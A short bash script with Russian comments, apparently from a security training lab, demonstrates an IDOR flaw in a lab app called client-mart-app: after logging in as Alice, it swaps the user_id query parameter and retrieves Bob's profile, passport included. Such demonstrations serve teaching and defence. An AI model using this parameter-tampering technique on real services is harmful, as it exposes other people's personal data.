#!/usr/bin/env bash
# Сценарий 1: IDOR в client-mart-app.
# Демонстрирует жалобу из кейса — «в личном кабинете виден другой ФИО».
#
# Что делаем:
#   1) Логинимся как Алиса (user_id=1) и смотрим её /profile — ОК.
#   2) С тем же «токеном» меняем ?user_id=2 → получаем ЛК Боба, включая паспорт.
set -euo pipefail
cd "$(dirname "$0")"; source ./_lib.sh
ensure_tester

hdr "1. Алиса логинится"
ALICE_TOKEN=$(curl_from_tester -X POST http://client-mart-app/login \
  -H 'content-type: application/json' \
  -d '{"email":"alice@example.com","password":"pwd-alice"}' | jq -r .token)
ok "Получен токен Алисы: $ALICE_TOKEN"

hdr "2. Алиса смотрит свой профиль"
curl_from_tester "http://client-mart-app/profile?user_id=1&token=$ALICE_TOKEN" | jq

hdr "3. Алиса меняет user_id=2 в query и видит профиль Боба"
note "Никакой смены пользователя — тот же 'токен', просто другой ?user_id"
curl_from_tester "http://client-mart-app/profile?user_id=2&token=$ALICE_TOKEN" | jq

bad "Утечка: чужие ФИО, телефон, e-mail и паспорт доступны по подмене ?user_id"
say "Это и есть жалоба клиента из кейса: 'в ЛК видны данные другого клиента'"
